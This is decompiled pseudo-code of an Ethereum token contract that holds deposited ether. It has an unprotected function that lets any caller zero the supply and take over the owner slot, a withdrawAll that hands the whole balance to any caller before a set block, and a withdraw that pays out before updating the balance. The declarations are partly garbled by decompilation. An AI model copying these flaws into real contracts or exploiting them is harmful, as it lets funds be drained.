contract main {




// =====================  Runtime code  =====================


uint256 totalSupply;
address stor1; offset 8
uint256 stor1; offset 8
mapping of uint256 allowance;
mapping of uint256 balanceOf;

function totalSupply() {
    return totalSupply
}

function balanceOf(address arg1) {
    return balanceOf[address(arg1)]
}

function allowance(address arg1, address arg2) {
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function sub_9d2864c9(?) {
    totalSupply = 0
    Mask(248, 0, stor1) = Mask(248, 0, msg.sender)
}

function approve(address arg1, uint256 arg2) {
    allowance[msg.sender][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function deposit() payable {
    if msg.value + balanceOf[msg.sender] < msg.value:
        return 0
    if totalSupply + msg.value < msg.value:
        return 0
    balanceOf[msg.sender] += msg.value
    totalSupply += msg.value
    return 1
}

function transfer(address arg1, uint256 arg2) {
    if arg2 > balanceOf[msg.sender]:
        return 0
    if arg2 > arg2 + balanceOf[address(arg1)]:
        return 0
    balanceOf[msg.sender] -= arg2
    balanceOf[arg1] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function withdraw(uint256 arg1) payable {
    if arg1 > balanceOf[msg.sender]:
        return 0
    call msg.sender with:
       value arg1 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    balanceOf[msg.sender] -= arg1
    totalSupply -= arg1
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    if arg3 > balanceOf[address(arg1)]:
        return 0
    if arg3 > allowance[address(arg1)][msg.sender]:
        return 0
    if arg3 > arg3 + balanceOf[address(arg2)]:
        return 0
    balanceOf[address(arg1)] -= arg3
    balanceOf[arg2] += arg3
    allowance[address(arg1)][msg.sender] -= arg3
    return 1
}

function withdrawAll() payable {
    require 5 * 10^17 < totalSupply
    if block.number <= 5040270:
        call msg.sender with:
           value eth.balance(this.address) wei
             gas 2300 * is_zero(value) wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
    else:
        require msg.sender == address(stor1)
        call address(stor1) with:
           value eth.balance(this.address) wei
             gas 2300 * is_zero(value) wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        call msg.sender with:
           value eth.balance(this.address) wei
             gas 2300 * is_zero(value) wei
}



}
